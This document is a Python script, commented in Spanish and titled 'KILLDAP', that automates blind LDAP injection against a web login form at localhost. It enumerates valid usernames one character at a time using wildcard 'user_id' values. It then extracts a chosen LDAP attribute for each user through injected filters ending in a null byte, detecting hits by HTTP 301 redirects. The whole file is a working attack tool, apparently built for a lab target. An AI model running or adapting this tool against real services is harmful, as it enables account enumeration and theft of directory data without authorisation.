#!/usr/bin/python3

import requests
import time
import sys
import signal
import string
import subprocess
from pwn import *
import random

def print_logo():
    clear = "\x1b[0m"
    colors = [31, 32, 33, 34, 35, 36]

    logo = """
 _     _ _____               ______  _______  _____      
 |____/    |   |      |      |     \\ |_____| |_____]     
 |    \\_ __|__ |_____ |_____ |_____/ |     | |           
                                                        
    """
    for line in logo.split("\n"):
        sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))

print_logo()



# ctrl_c
def def_handler(sig, frame):
    print ("\n\n[!] Saliendo...\n")
    sys.exit(1)

# VARS:
url="http://localhost:8888"
headers={'Content-Type': 'application/x-www-form-urlencoded'}
script_path = './methods.sh'

def getMethods(script_path):
    result = subprocess.run([script_path], capture_output=True, text=True, shell=True)
    ldap_methods = [line for line in result.stdout.split('\n') if line]
    return ldap_methods

def getInitUsers():
    characters = string.ascii_lowercase
    initial_users=[]
    progress = log.progress("Buscando usuarios iniciales")
    total = len(characters)
    for i, chr in enumerate(characters):
        progress.status(f"Probando {chr} ({i+1}/{total})")
        dataUsers=f"user_id={chr}*&password=*&login=1&submit=Submit"
        r=requests.post(url, data=dataUsers, allow_redirects=False, headers=headers)
        if r.status_code == 301:
            initial_users.append(chr)
        time.sleep(0.1)  # Pequeña pausa para visualizar mejor el progreso
    progress.success("Finalizado")
    return initial_users


from pwn import log

def getUsers(initial_users):
    characters = string.ascii_lowercase + string.digits + '_.$%#*-=@'
    valid_users = []
    total_initial_users = len(initial_users)
    user_progress = log.progress("Expandiendo usuarios iniciales")
    valid_users_progress = log.progress("Usuarios válidos encontrados")

    for i, frst_user in enumerate(initial_users):
        user_progress.status(f"Expandiendo {frst_user} ({i+1}/{total_initial_users})")
        user = frst_user
        for position in range(0, 15):
            found_char = False
            for chr in characters:
                dataUsers = f"user_id={user}{chr}*&password=*&login=1&submit=Submit"
                r = requests.post(url, data=dataUsers, allow_redirects=False, headers=headers)
                if r.status_code == 301:
                    user += chr
                    found_char = True
                    break
            if not found_char:
                break
        valid_users.append(user)
        valid_users_progress.status(f"{len(valid_users)} usuarios válidos")
        time.sleep(0.1)  # Pequeña pausa para mejor visualización

    user_progress.success(valid_users)
    valid_users_progress.success(f"{len(valid_users)} usuarios válidos encontrados al finalizar")

    return valid_users


def getDataMethods(valid_users, ldap_methods):
    characters = string.ascii_lowercase + string.digits + '_.$%#*-=@{} '
    extractedData = []

    # Presentación de los métodos disponibles
    print("\n[+] Métodos disponibles:")
    for idx, method in enumerate(ldap_methods, start=1):
        print(f"{idx}. {method}")

    try:
        selec_method = int(input("Seleccione un método por posición: "))
        if selec_method < 1 or selec_method > len(ldap_methods):
            print("Selección fuera de rango. Saliendo.")
            return extractedData
    except ValueError:
        print("Entrada inválida. Por favor, introduzca un número.")
        return extractedData

    selected_method = ldap_methods[selec_method - 1]

    progress = log.progress("Extrayendo datos")
    total_users = len(valid_users)
    for idx, user in enumerate(valid_users):
        progress.status(f"Procesando {user} ({idx+1}/{total_users})")
        dataExtracted = ""
        for position in range(0, 35):
            found_char = False
            for chr in characters:
                dataUsers = f"user_id={user})({selected_method}={dataExtracted}{chr}*))%00&password=*&login=1&submit=Submit"
                r = requests.post(url, data=dataUsers, allow_redirects=False, headers=headers)
                if r.status_code == 301:
                    dataExtracted += chr
                    found_char = True
                    break
            if not found_char:
                break
        if dataExtracted:
            extractedData.append({"user": user, "method": selected_method, "data": dataExtracted})
        time.sleep(0.1)  # Pequeña pausa para visualización
    progress.success("Finalizado")

    # Mejora en la impresión de resultados
    print("\n[+] Resultados de Extracción de Datos:")
    for data in extractedData:
        print(f"-> Usuario: {data['user']} --- Método: {data['method']} --- Datos: {data['data']}")
    print("\n[+] Extracción completada.\n")


if __name__ == "__main__":
    ldap_methods = getMethods(script_path)

    initial_users = getInitUsers()

    valid_users = getUsers(initial_users)

    extractedData = getDataMethods(valid_users, ldap_methods)
    print(extractedData)
